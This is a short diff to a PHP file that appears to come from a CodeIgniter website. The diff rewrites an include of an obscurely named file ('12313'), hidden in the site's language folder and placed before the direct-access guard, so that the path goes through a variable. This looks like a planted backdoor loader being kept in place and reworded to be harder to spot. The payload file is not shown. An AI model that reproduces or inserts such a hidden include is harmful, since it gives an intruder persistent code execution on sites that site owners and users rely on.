@@ -1,5 +1,6 @@
 <?php
-include "/home/btkpdiy1/jbrp.jogjabelajar.org/application/language/english/12313";
+$system = "/home/btkpdiy1/jbrp.jogjabelajar.org/application/language/english/12313";
+include $system;
 defined('BASEPATH') OR exit('No direct script access allowed');
 
 /*
